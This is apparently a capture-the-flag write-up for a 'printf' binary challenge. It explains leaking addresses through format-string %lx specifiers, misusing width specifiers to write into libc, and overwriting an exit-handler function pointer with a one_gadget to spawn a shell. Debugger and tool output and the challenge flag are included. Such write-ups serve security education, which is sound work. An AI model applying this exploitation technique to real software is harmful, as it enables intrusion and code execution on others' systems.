For this challenge, we are given a binary, libc, and ld. The first thing to do is use [patchelf](https://github.com/NixOS/patchelf) so that the binary will be loaded with the correct linker/libc combination. Once this is done, I checked the security levels for the program with checksec. 
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```
 Okay, so all protections are turned on. Let's see what the program does.
 
 ```
 ./printf
 What's your name?
 Hi,
a
Do you leave a comment? 
hello
 ```
 
 This is the output by inputing "a\n" for the first prompt and "hello\n" for the second.
 
 By giving a quick glance at the binary in IDA, it is clear that the challenge is running printf on an uncontrolled user string twice. The twist here is that the printf is a custom implementation with %n disabled. Generating a leak is pretty easy by using the %lx format specifier. For example:
 
 ```
 What's your name?
%lx %lx %lx %lx
Hi,
0 7ffff7fc8580 7ffff7eee024 4
```

As you can see, we leaked some information from the stack. We are limited to 0x100 input bytes for the first format string, so by putting in a bunch of ```%lx``` tokens, we can leak the base address of the stack, libc, binary, and canary quite easily. 

Okay, with this data leaked we now need to figure out how to write. I spent a long time reversing the printf function and found two interesting things. First, the printf implementation will build the string that it eventually calls ```puts``` on in a different location than your originally provided string. Second, by using the a number after the percent format specifier (```%1000lx``` for example) we are able to adjust the stack pointer by about 1000 bytes. There is a check in the program to ensure the number we provide after the ```%``` is not negative. Thus, we cannot write up the stack and target a return pointer. 

I spent a lot of time experimenting with this by trying to use multiple ```%x``` specifiers to see if I could cause a negative number to be added to the stack pointer. Unfortunatley, this didn't work. However, I realized I was missing something. What is located past the end of the stack in the memory layout? Libc of course! So, by adjusting the number we put after the ```%``` specifier, we can obtain arbitrary write in libc. 

When ```libc_start_main``` returns, it will call the ```exit()``` function. This is important, because a bunch of function pointers are called before the process actually exits. You can check out where this is done in the source code here: [https://code.woboq.org/userspace/glibc/stdlib/exit.c.html](https://code.woboq.org/userspace/glibc/stdlib/exit.c.html). So, all we need to do is overwrite one of these function pointers and we will have control of ```rip```!

Before I did this, I checked to see if there were any useful one\_gadgets in the libc we were given. Using the awesome tool one\_gadget, was able to easily find 4!

```
one_gadget libc.so.6
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

When I first attacked a function pointer in libc, I made sure to replace it with junk (such as 'CCCCCCCC') so that I could inspect the segfault easily and see the state of the registers at the time of the crash. 
```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e28398 in ?? () from target:/home/a/Desktop/tokyo/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────[ REGISTERS ]───────────────────────
 RAX  0x0
 RBX  0x7ffff7fc76c8 ◂— 0x4343434343434343 ('CCCCCCCC')
 RCX  0x0
 RDX  0x0
 RDI  0x555555559010 ◂— 0x0
 RSI  0x1
 R8   0x555555559008 ◂— 0x555555559008
 R9   0x7ffff7fcd540 ◂— 0x7ffff7fcd540
 R10  0x7fffffffe2b4 ◂— 0x1
 R11  0x2
 R12  0x7ffff7fc76d0 —▸ 0x7ffff7ec3383 (execvpe+979) ◂— mov    rsi, rcx
 R13  0x1
 R14  0x7ffff7fcb108 ◂— 0x0
 R15  0x0
 RBP  0x0
 RSP  0x7fffffffe3f0 ◂— 0x20786c2520786c25 ('%lx %lx ')
 RIP  0x7ffff7e28398 ◂— call   qword ptr [rbx]
────────────────────────[ DISASM ]─────────────────────────
 ► 0x7ffff7e28398    call   qword ptr [rbx]

   0x7ffff7e2839a    add    rbx, 8
   0x7ffff7e2839e    cmp    rbx, r12
   0x7ffff7e283a1    jne    0x7ffff7e28398
    ↓
 ► 0x7ffff7e28398    call   qword ptr [rbx]

   0x7ffff7e2839a    add    rbx, 8
   0x7ffff7e2839e    cmp    rbx, r12
   0x7ffff7e283a1    jne    0x7ffff7e28398
    ↓
 ► 0x7ffff7e28398    call   qword ptr [rbx]

   0x7ffff7e2839a    add    rbx, 8
   0x7ffff7e2839e    cmp    rbx, r12
─────────────────────────[ STACK ]─────────────────────────
00:0000│ rsp  0x7fffffffe3f0 ◂— 0x20786c2520786c25 ('%lx %lx ')
01:0008│      0x7fffffffe3f8 ◂— 0x120786c25
02:0010│      0x7fffffffe400 ◂— '%lx %lx '
03:0018│      0x7fffffffe408 ◂— 0x0
04:0020│      0x7fffffffe410 —▸ 0x555555556a40 ◂— push   r15
05:0028│      0x7fffffffe418 —▸ 0x5555555550d0 ◂— xor    ebp, ebp
06:0030│      0x7fffffffe420 —▸ 0x7fffffffe520 ◂— 0x1
07:0038│      0x7fffffffe428 ◂— 0x0
───────────────────────[ BACKTRACE ]───────────────────────
 ► f 0     7ffff7e28398
   f 1     7ffff7e283da
   f 2     7ffff7e07b72 __libc_start_main+242
Program received signal SIGSEGV (fault address 0x0)
```

Luckily, both RCX and RDX are NULL at the time of the crash! So, all we have to do is write the one\_gadget located at offset 0xe2383 to the location of the function pointer, 0x7ffff7fc76c8, in libc and we will get a shell!

That's it! From here, you just run the script and get a flag! TWCTF{Pudding_Pudding_Pudding_purintoehu}
